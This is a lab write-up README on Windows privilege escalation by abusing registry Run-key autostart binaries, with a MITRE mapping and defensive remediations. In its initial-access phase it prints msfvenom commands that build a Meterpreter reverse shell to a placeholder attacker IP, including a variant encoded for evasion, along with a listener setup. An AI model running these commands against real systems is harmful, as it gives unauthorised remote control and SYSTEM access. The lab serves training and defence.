# Windows-LPE-Registry-Privilege-Escalation

**Windows Privilege Escalation via Registry Abuse (Red Team / Blue Team Lab)**

> Hands-on post-exploitation lab in an isolated Windows environment, focused on **Local Privilege Escalation (LPE)** techniques through Windows Registry keys, including the corresponding defensive analysis and remediation.

---

## 📌 Overview

This project documents a complete pentesting exercise against a vulnerable Windows machine, covering the full cycle:

1. Payload generation and delivery (Meterpreter) with `msfvenom`.
2. Initial access via `exploit/multi/handler`.
3. Enumeration of the compromised host from a low-privileged shell.
4. Abuse of **Windows Registry** keys (`regedit`) as a persistence and privilege escalation vector.
5. Identification of insecure default configurations that allow privilege escalation without relying on kernel exploits.

The goal is to understand **why** these registry paths are critical in offensive operations, and which defensive controls mitigate them.

---

## 🧪 Lab Environment

| Component | Detail |
|---|---|
| Attacker | Kali Linux |
| Victim | Windows (LPE-vulnerable, `HETEAM` domain) |
| Initial user | `HETEAM\user` (unprivileged) |
| C2 Framework | Metasploit Framework (`msfconsole`) |
| Network | Isolated (VirtualBox / controlled lab) |

> ⚠️ **Ethical note:** everything documented here was executed exclusively in an isolated, controlled lab environment for educational purposes. None of the techniques described should be applied against systems without explicit authorization.

---

## 🛠️ Phase 1 — Initial Access

### Payload generation

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o payload_LPE.exe
```

- **Staged** (`meterpreter/reverse_tcp`) instead of *Stageless*, for more flexibility when sending the second stage.
- Encoded variant to make detection by simple signatures harder:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -e x64/zutto_dekiru -i 5 -f exe -o payload_LPE.exe
```

### Delivery and execution

- Temporary HTTP server for file transfer: `python3 -m http.server 8082`
- Download from the victim via browser (handling Chrome's download quarantine).
- Listener configured in Metasploit:

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
exploit -j
```

### Result

Meterpreter session obtained as a standard user (`HETEAM\user`), with no administrative privileges (`getsystem` fails, as expected at this stage).

---

## 🔑 Phase 2 — Enumeration and Escalation via Windows Registry

### Why the Registry?

The Windows Registry is the hierarchical database that stores OS and application configuration. It's a high-value target in Red Team operations for three reasons:

1. **Persistence** — autostart keys (`Run`, `Winlogon\Shell`).
2. **Privilege escalation** — insecure default configurations (`AlwaysInstallElevated`, service paths with weak permissions).
3. **Evasion / exfiltration** — disabling Defender/Event Logs, storing fileless payloads.

### Enumeration from a Shell (not Meterpreter)

```cmd
shell
reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
```

### Key analyzed: `Run` Key

| | |
|---|---|
| Path | `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` |
| Scope | Machine-wide (affects all users) |
| Required privileges (in theory) | Administrator |
| Finding in this lab | The system administrator left write permissions on an *existing* autostart binary — **this was not exploiting a service misconfiguration, but a permissions error on an already-configured program** |

### Exploitation vector

By identifying that the unprivileged user could **write** to the binary referenced by an existing autostart entry (rather than creating a new registry key), it was possible to:

- Overwrite/replace the autostart binary.
- Wait for the next session/service restart to trigger execution with elevated privileges.
- Obtain a session with `NT AUTHORITY\SYSTEM` or administrator privileges on the next execution cycle.

---

## 🗺️ MITRE ATT&CK Mapping

| Technique | ID | Phase |
|---|---|---|
| Boot or Logon Autostart Execution (Registry Run Keys) | T1547.001 | Persistence / Privilege Escalation |
| Query Registry | T1012 | Discovery |
| Exploitation for Privilege Escalation | T1068 | Privilege Escalation |
| Command and Scripting Interpreter (PowerShell) | T1059.001 | Execution |

---

## 🛡️ Remediation (Blue Team Perspective)

| Finding | Risk | Remediation |
|---|---|---|
| Standard user has write permissions on an autostart binary | Escalation to SYSTEM/Admin | Apply restrictive ACLs (`icacls`) on binaries referenced by `Run`/`RunOnce`; only `Administrators`/`SYSTEM` should have write access |
| No monitoring of changes to `HKLM\...\Run` | Undetected persistence | SIEM alerts on autostart key modifications (Sysmon Event ID 13) |
| `AlwaysInstallElevated` enabled (if applicable) | `.msi` installation with SYSTEM privileges | Disable the policy via GPO (`Computer Configuration > Administrative Templates > Windows Installer`) |
| No integrity validation on boot binaries | Execution of unauthorized payload | Implement AppLocker / WDAC + hashing of critical binaries |

---

## 🧰 Tools Used

`Kali Linux` · `msfvenom` · `Metasploit Framework (multi/handler, Meterpreter)` · `reg query` / `regedit` · `Windows CMD/PowerShell`

---

## ⚖️ Disclaimer

This repository is for **educational purposes only** and was developed in an isolated lab environment as part of Red Team / Blue Team training. It must not be used against systems, networks, or assets without explicit, written authorization from the owner.

---

**Author:** Juan Andrés Alba Peralta — Cybersecurity Professional (Purple Team & SOC Operations)
